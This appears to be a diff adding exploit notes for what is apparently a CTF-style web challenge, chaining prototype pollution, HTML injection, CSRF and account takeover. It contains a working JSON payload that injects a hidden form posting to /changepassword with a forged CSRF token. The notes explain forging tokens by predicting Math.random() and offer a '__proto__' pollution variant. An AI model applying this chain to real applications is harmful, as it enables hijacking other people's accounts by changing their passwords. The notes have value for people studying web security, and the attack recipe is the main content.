@@ -1,0 +1,40 @@
+Prototype pollution / HTML injection / CSRF / ATO
+
+
+template = {
+  "wordsToShow":30,
+  "wordLenght":[],
+  "secondInTest":30,
+  "sparse_events":{},
+  "te_t":[],
+  "te_avgWpmStr": "<form action='/changepassword' method='POST'> <input type='hidden' name='_csrf' value='{}'> <input type='test' name='newPassword' value='{}'><button type='submit' class='save-results-button'> Save Results</button></form>"
+  ^^ 
+  ------------------------------------------------
+     1) gets set as a 
+        if (key.startsWith('te_')) {
+          dataObj[key.slice(3)] = decodedData[key];
+
+
+    2) avgWpmStr is never modified bcs there's no correct_total (no 'c's or 'i's):
+
+      if (totalCorrect >= 1) {
+          let totalCorrectLettersTyped = 0;
+          for (let j = 0; j < dataObj.c.length; j++) {
+              totalCorrectLettersTyped += dataObj.c[j] == 'c';
+          }
+      3) CSRF because they're using math.random() * SOME_CONSTANT_NUMBER 
+        to generate our CSRF and there's actually a trick in math.random() if 
+          it is multiplied by a constant number we can actually forge CSRF tokens:
+          [*] https://github.com/d0nutptr/v8_rand_buster basically this 
+
+
+    4) we could've also used "__proto__": {"avgWpmStr": "HTML_INJECTION_HERE"}
+
+    5) this works because the admin clicks the "save button", moreover we get the username returned:
+        to us in the response:
+          await page.goto('http://localhost:3000/results?data=' + data);
+          await delay(2000);
+          await page.click('button[type=submit].save-results-button');
+
+  ------------------------------------------------
+}
